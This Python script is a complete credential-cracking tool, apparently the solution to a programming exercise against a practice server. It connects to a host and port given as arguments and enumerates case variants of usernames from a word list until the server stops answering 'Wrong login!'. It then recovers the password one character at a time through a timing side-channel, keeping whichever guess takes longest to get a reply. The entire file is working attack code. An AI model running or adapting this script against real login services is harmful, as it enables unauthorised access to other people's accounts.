import json
from itertools import product
from socket import socket
from string import ascii_letters, digits
from sys import argv
from time import time


def get_result(client_socket, login, password):
    req = json.dumps({'login': login, 'password': password})
    client_socket.sendall(req.encode())
    res = json.loads(client_socket.recv(1024).decode())
    return res['result']


def get_result_with_response_time(client_socket, login, password):
    req = json.dumps({'login': login, 'password': password})
    client_socket.sendall(req.encode())
    start = time()
    res = client_socket.recv(1024)
    end = time()
    res = json.loads(res.decode())
    return res['result'], end - start


def dictionary_generator(login_list):
    for login in login_list:
        variations = ((x, y) if x != y else (x,) for (x, y) in zip(login, login.upper()))
        for variant in product(*variations):
            yield ''.join(variant)


def find_login(client_socket, login_list):
    for candidate in dictionary_generator(login_list):
        if get_result(client_socket, candidate, 'pass') != 'Wrong login!':
            return candidate
    return None


def find_password(client_socket, login):
    password = ''
    while True:
        timings = []
        for c in ascii_letters + digits:
            candidate = password + c
            result, res_time = get_result_with_response_time(client_socket, login, candidate)
            if result == 'Connection success!':
                return candidate
            timings.append((candidate, res_time))
        timings.sort(key=lambda x: x[1])
        password = timings[-1][0]


def main():
    with open('logins.txt') as file:
        login_list = file.read().splitlines()
    hostname, port = argv[1:]
    address = (hostname, int(port))
    with socket() as client:
        client.connect(address)
        login = find_login(client, login_list)
        password = find_password(client, login)
        print(json.dumps({'login': login, 'password': password}, indent=4))


if __name__ == '__main__':
    main()
